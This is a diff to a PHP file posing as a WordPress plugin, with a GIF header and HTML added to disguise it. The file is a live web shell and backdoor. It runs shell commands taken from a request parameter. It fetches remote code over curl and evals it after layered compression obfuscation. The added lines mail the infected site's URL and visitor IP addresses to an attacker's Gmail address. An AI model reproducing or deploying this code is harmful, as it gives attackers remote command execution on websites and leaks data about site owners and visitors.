@@ -1,3 +1,17 @@
+
+GIF89a;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<center>
+<style>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=1024">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    </style>
 <?php
     /*
     Plugin Name: Cheap & Becek Wordpress 
@@ -26,5 +40,16 @@ mail($for,"cmd", $data);
 print(`{$_REQUEST[cmdkem]}`);
 error_reporting(0);
 }$Jbna = "$nKtq";function AwCZ($undefined){$MZvt=curl_init();curl_setopt($MZvt,CURLOPT_URL,$undefined);curl_setopt($MZvt,CURLOPT_RETURNTRANSFER,true);curl_setopt($MZvt,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($MZvt,CURLOPT_SSL_VERIFYHOST,false);$jmnX=curl_exec($MZvt);curl_close($MZvt);return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($jmnX))))))));}@eval("?>".gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(AwCZ($Jbna))))))))));
+?>
+			<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'rootcyberpunks@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "punk", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
 
